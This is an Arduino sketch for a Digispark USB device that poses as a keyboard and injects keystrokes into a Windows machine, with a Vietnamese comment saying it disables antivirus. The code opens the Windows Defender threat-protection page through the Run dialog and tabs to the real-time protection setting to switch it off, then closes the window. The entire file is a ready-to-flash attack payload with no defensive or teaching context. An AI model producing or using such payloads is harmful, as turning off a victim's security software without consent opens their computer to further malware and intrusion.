#include "DigiKeyboard.h" 
// cái shell này dùng để disable AVR
void setup() { 

//empty 

} 

void loop(){ 

//Kill Windows Defender 

DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

DigiKeyboard.delay(1000); 

DigiKeyboard.println("Windowsdefender://threat/"); 

DigiKeyboard.delay(2000); 

DigiKeyboard.print("\t");//Press TAB 1 

DigiKeyboard.delay(500); 

DigiKeyboard.print("\t");//Press TAB 2 

DigiKeyboard.delay(500); 

DigiKeyboard.print("\t");//Press TAB 3 

DigiKeyboard.delay(500); 

DigiKeyboard.print("\t");//Press TAB 4 

DigiKeyboard.delay(500); 

DigiKeyboard.sendKeyStroke(KEY_ENTER); 

DigiKeyboard.delay(1500); 

DigiKeyboard.sendKeyStroke(KEY_SPACE); 

DigiKeyboard.delay(1500); 

DigiKeyboard.print("\t");//Press TAB 6 

DigiKeyboard.delay(500); 

DigiKeyboard.print("\t");//Press TAB 7 

DigiKeyboard.delay(500); 

DigiKeyboard.sendKeyStroke(KEY_ENTER); 

DigiKeyboard.delay(500); 

DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); 

for(;;);
}
